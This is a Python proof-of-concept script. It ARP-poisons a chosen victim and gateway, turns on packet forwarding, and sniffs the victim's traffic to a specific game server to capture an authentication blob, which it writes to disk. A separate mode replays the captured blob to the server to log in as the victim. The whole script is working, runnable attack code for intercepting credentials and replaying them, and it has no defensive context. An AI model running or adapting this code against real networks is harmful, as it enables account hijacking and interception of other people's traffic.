#!/usr/bin/env python3
"""
usage:
  sudo python3 poc.py mitm   -i eth0 -t 10.0.1.17 [-g 10.0.1.1]
  python3 poc.py decode <HEX>
  python3 poc.py auth   <HEX>
"""

import argparse, os, socket, struct, subprocess, sys, time
sys.stdout.reconfigure(line_buffering=True)

GAME_HOST  = "34.48.22.1"
GAME_PORT  = 30031
MAGIC      = bytes.fromhex("50010000")

# ---------------------------------------------------------------------------

def recv_exactly(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("server closed")
        buf.extend(chunk)
    return bytes(buf)

def read_frame(sock):
    hdr = recv_exactly(sock, 4)
    return hdr + recv_exactly(sock, struct.unpack_from("<I", hdr)[0])

def decode(data: bytes) -> list[str]:
    print(f"Buffer: {len(data)} bytes\n")
    results, i = [], 0
    while i < len(data) - 4:
        length = struct.unpack_from('<I', data, i)[0]
        if 2 <= length <= 200:
            end = i + 4 + length
            if end <= len(data):
                chunk = data[i+4:end]
                if all(0x20 <= b < 0x7f for b in chunk):
                    s = chunk.decode()
                    print(f"  0x{i:04x}  [{length:3d}]  {s}")
                    results.append(s)
                    i = end
                    continue
        i += 1
    return results

# ---------------------------------------------------------------------------

def authenticate(blob: bytes):
    sock = socket.create_connection((GAME_HOST, GAME_PORT))

    challenge = read_frame(sock)
    print(f"[*] challenge  ({len(challenge)} bytes)")

    sock.sendall(struct.pack('<I', len(blob)) + blob)
    print(f"[*] auth  ({len(blob)} bytes)\n")
    decode(blob)

    while True:
        try:
            frame = read_frame(sock)
        except (ConnectionError, OSError) as e:
            print(f"[!] {e}")
            break

        print(f"\n[←] frame ({len(frame)} bytes)")
        decode(frame)

    sock.close()

# ---------------------------------------------------------------------------

def get_gateway() -> str | None:
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return None

def get_mac(iface: str) -> str:
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()

def _ipt(*args):
    subprocess.run(list(args), capture_output=True)

def setup_forwarding(iface: str):
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    _ipt("iptables", "-t", "raw", "-I", "PREROUTING", "-i", iface, "-j", "NOTRACK")
    _ipt("iptables", "-t", "raw", "-I", "OUTPUT",     "-o", iface, "-j", "NOTRACK")
    _ipt("iptables", "-I", "FORWARD", "-i", iface, "-j", "ACCEPT")
    _ipt("iptables", "-I", "FORWARD", "-o", iface, "-j", "ACCEPT")

def teardown_forwarding(iface: str):
    _ipt("iptables", "-t", "raw", "-D", "PREROUTING", "-i", iface, "-j", "NOTRACK")
    _ipt("iptables", "-t", "raw", "-D", "OUTPUT",     "-o", iface, "-j", "NOTRACK")
    _ipt("iptables", "-D", "FORWARD", "-i", iface, "-j", "ACCEPT")
    _ipt("iptables", "-D", "FORWARD", "-o", iface, "-j", "ACCEPT")

def _extract_blob(stream: bytes) -> bytes | None:
    idx = stream.find(b'\x14\x00\x00\x00')
    if idx < 4:
        return None
    length = struct.unpack_from("<I", stream, idx - 4)[0]
    if not (100 < length < 0x800):
        return None
    end = idx + length
    if end > len(stream):
        return None
    return stream[idx - 4 : end]

def poison(iface: str, victim: str, gateway: str):
    setup_forwarding(iface)
    spoof = [
        subprocess.Popen(["arpspoof", "-i", iface, "-t", victim,  gateway],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["arpspoof", "-i", iface, "-t", gateway, victim],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
    ]
    print(f"[+] poisoning {victim} ↔ {gateway}")
    time.sleep(1.5)

    mac = get_mac(iface)
    bpf = f"ether dst {mac} and tcp and src host {victim} and dst port {GAME_PORT}"
    tshark = subprocess.Popen(
        ["tshark", "-i", iface, "-f", bpf, "-T", "fields", "-e", "tcp.payload", "-l"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1.0)
    if tshark.poll() is not None:
        sys.exit(f"[-] tshark: {tshark.stderr.read().decode(errors='replace').strip()}")

    print("[*] listening for traffic")

    buf, pkt_count = bytearray(), 0
    try:
        while True:
            line = tshark.stdout.readline()
            if not line: break
            line = line.decode("ascii", errors="ignore").strip()
            if not line: continue
            try:
                buf.extend(bytes.fromhex(line.replace(":", "")))
            except ValueError:
                continue
            pkt_count += 1
            if pkt_count == 1:
                print("[*] traffic detected")
            blob = _extract_blob(bytes(buf))
            if blob:
                payload = blob[4:]
                with open("capture.bin", "a") as fh:
                    fh.write(payload.hex() + "\n")
                print("written to capture.bin\n")
                decode(payload)
                break
            if MAGIC not in buf and len(buf) > 16384:
                buf[:] = buf[-2048:]
    finally:
        tshark.terminate()
        for p in spoof: p.terminate()
        teardown_forwarding(iface)

# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "  sudo %(prog)s mitm -i eth0 -t 10.0.1.17 [-g 10.0.1.1]\n"
            "  %(prog)s decode <HEX>\n"
            "  %(prog)s auth <HEX>\n"
        ),
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    mp = sub.add_parser("mitm",   help="arp poison and capture auth blob")
    mp.add_argument("-i", dest="iface",   required=True)
    mp.add_argument("-t", dest="victim",  required=True)
    mp.add_argument("-g", dest="gateway", default=None)

    dp = sub.add_parser("decode", help="decode a hex blob")
    dp.add_argument("hex")

    ap = sub.add_parser("auth",   help="authenticate with hex blob")
    ap.add_argument("hex")

    args = parser.parse_args()

    if args.mode == "mitm":
        if os.geteuid() != 0:
            sys.exit("[-] mitm requires root (sudo)")
        for tool, pkg in [("arpspoof", "dsniff"), ("tshark", "tshark")]:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                sys.exit(f"[-] {tool} not found — apt install {pkg}")
        gateway = args.gateway or get_gateway()
        if not gateway:
            sys.exit("[-] cannot detect gateway — use -g")
        poison(args.iface, args.victim, gateway)

    elif args.mode == "decode":
        decode(bytes.fromhex(args.hex.replace(" ", "")))

    elif args.mode == "auth":
        authenticate(bytes.fromhex(args.hex.replace(" ", "")))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[*] interrupted")
